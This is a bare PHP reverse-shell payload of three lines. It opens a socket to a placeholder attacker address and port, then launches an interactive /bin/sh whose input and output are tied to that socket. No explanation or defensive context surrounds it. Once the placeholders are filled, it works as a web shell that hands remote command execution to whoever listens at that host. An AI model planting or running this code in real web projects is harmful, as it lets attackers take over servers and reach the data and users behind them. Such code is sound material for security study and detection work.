<?php
$sock = fsockopen("attacker_ip", attacker_port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>